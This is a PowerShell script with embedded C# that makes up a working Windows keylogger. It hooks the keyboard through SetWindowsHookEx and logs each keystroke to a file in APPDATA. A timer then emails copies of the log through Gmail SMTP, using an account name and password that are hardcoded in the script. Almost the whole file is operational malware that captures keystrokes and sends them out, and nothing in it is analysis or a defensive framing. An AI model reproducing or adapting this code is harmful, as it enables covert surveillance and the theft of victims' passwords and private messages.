Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;

public class KeyLogger {
    private static StreamWriter logWriter;
    private static IntPtr hookId = IntPtr.Zero;

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static LowLevelKeyboardProc proc = HookCallback;

    public static void Start() {
        Console.WriteLine("[*] Starting keylogger...");
        logWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\keys.txt", true);
        hookId = SetHook(proc);
        Application.Run();
        UnhookWindowsHookEx(hookId);
        logWriter.Close();
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule) {
            return SetWindowsHookEx(13, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)0x100) { // WM_KEYDOWN
            int vkCode = Marshal.ReadInt32(lParam);
            logWriter.WriteLine(((Keys)vkCode).ToString());
            logWriter.Flush();
        }
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}
"@ -ReferencedAssemblies "System.Windows.Forms", "System.Drawing"

Write-Host "[*] Timer setup..."

$EmailTimer = New-Object Timers.Timer
$EmailTimer.Interval = 60000
$EmailTimer.AutoReset = $true
$EmailTimer.Enabled = $true

Register-ObjectEvent -InputObject $EmailTimer -EventName Elapsed -Action {
    try {
        Write-Host "[*] Email timer triggered..."
        $logFile = "$env:APPDATA\keys.txt"
        $tempCopy = "$env:APPDATA\keysCopy.txt"

        if (-Not (Test-Path $logFile)) {
            Write-Host "[!] Log file not found: $logFile"
            return
        } else {
            Write-Host "[+] Found log file."
        }

        Copy-Item -Path $logFile -Destination $tempCopy -Force

        if (-Not (Test-Path $tempCopy)) {
            Write-Host "[!] Failed to create copy of log file!"
            return
        } else {
            Write-Host "[+] Copied log file to $tempCopy"
        }

        # Email config
        $smtpServer = "smtp.gmail.com"
        $smtpFrom   = "testingkl2025@gmail.com"
        $smtpTo     = "testingkl2025@gmail.com"
        $smtpUser   = "testingkl2025@gmail.com"
        $smtpPass   = "jlockpwdntkqdcn" 
        $subject    = "Keylog Report - $(Get-Date -Format 'g')"
        $body       = "Attached are the recent keystrokes."

        Write-Host "[*] Preparing to send email..."

        Send-MailMessage -From $smtpFrom -To $smtpTo -Subject $subject -Body $body -SmtpServer $smtpServer `
            -Port 587 -UseSsl `
            -Credential (New-Object System.Management.Automation.PSCredential($smtpUser, (ConvertTo-SecureString $smtpPass -AsPlainText -Force))) `
            -Attachments $tempCopy

        Write-Host "[+] Email sent successfully at $(Get-Date)"
    }
    catch {
        Write-Host "[!] Email failed: $_"
    }
}

Write-Host "[*] Sleeping for 10 minutes to allow email timer to trigger..."
Start-Sleep -Seconds 600

[KeyLogger]::Start()
